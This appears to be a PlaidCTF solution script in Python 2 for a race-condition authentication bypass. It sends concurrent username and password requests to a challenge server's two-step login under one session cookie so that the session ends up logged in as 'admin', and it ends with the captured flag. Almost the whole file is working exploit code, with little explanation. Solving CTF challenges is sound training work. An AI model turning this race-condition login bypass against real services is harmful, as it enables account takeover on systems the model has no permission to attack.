#!/usr/bin/python
import requests
import threading

cookies = {"session":"dd7fcc34-0f2f-46cc-a6b3-12a45144ed9e"}

login_id = "http://triggered.pwni.ng:52856/login"
login_pw = "http://triggered.pwni.ng:52856/login/password"
query_id = lambda x:{"username":x}
query_pw = lambda x:{"password":x}


def login_with_id(username):
	global login_id
	global cookies
	r = requests.post(login_id,data=query_id(username),cookies=cookies)
	print '[+] /user request done as %s.'%(username)
	return r.text

def login_with_pw(password):
	global login_pw
	global cookies
	r = requests.post(login_pw,data=query_pw(password),cookies=cookies)
	print '[+] /user/password request done.'
	return r.text

def target_1(username):
	login_with_id(username)

def target_2(password):
	output = login_with_pw(password)
	try:
		print output.split('Hey there,')[1][:5]
		if 'Hey there, admin' in output:
			print '[+] success!'
			return
	except:
		print 'fucking'

def main():
	threading.Thread(target=target_1, args=('admin',)).start()
	threading.Thread(target=target_1, args=('shpik',)).start()
	threading.Thread(target=target_2, args=('1',)).start()

if __name__=="__main__":
	main()

'''
PCTF{i_rAt3_p0sTgRE5_1O_oUT_0f_14_pH_n3ed5_m0Re_4Cid}
'''
